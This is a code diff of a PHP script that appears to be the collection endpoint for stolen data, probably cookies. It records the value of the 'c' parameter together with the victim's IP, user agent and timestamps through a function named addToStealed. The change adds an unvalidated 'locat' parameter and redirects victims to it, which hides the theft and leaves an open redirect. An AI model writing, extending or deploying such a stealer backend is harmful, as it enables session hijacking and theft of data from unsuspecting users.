@@ -28,11 +28,17 @@
 	}
 	
 	
-	if(isset($_GET['c']))	$data	= $_GET['c'];
-	else 					$data	= 'No data';
+	if(isset($_GET['c']))
+	{	
+		$data	= $_GET['c'];
+		$location	= $_GET['locat'];
+	}else{
+		$data	= 'No data';
+		$location = "https://www.google.com";
+	}
 	
 	
-	function check_if_excite($data)
+	function check_if_excite($data,$location)
 	{
 			$productFile = file_get_contents('admin.php');
 			$products = str_word_count($productFile, 1);
@@ -41,8 +47,11 @@
 			 	$found = TRUE;
 			 	echo " yes ";
 			 	echo $data;
-			 	echo ' ' ;
-			 	echo "<script>history.back();</script>";
+			 	echo ' myloact' ;
+			 	echo $location;
+			 	header('Location: ' . $location);
+		   		die();
+			 	// echo "<script>history.back();</script>";
 			 }else{
 
 			 	echo " no ";
@@ -52,7 +61,8 @@
 				$navigator	= $_SERVER['HTTP_USER_AGENT'];
 				$date		= date("d/m/Y");
 				$heure		= date("H:i:s");
-				$provenance	= (!empty($_SERVER['HTTP_REFERER'])) ? $_SERVER['HTTP_REFERER'] : 'Unspecified';
+				// $provenance	= (!empty($_SERVER['HTTP_REFERER'])) ? $_SERVER['HTTP_REFERER'] : 'Unspecified';
+				$provenance	= $location;
 
 				$cars = (int)file_get_contents("./count.txt");
 				// echo $cars;
@@ -65,12 +75,14 @@
 				fclose($counrtfile);
 			 	addToStealed("admin.php", $cars,  $ip, $host, $navigator, $date, $heure, $provenance, $data);
 		   		echo "Unauthorized Access";
-		   		echo "<script>history.back();</script>";
+		   		header('Location: ' . $location);
+		   		die();
+		   		// echo "<script>history.back();</script>";
 			 }
 			// echo $products;
 			
 	}
-	check_if_excite($data);
+	check_if_excite($data,$location);
 	// if ($found) {
 	//      echo 'The status doesnt contain a product';
 	// }
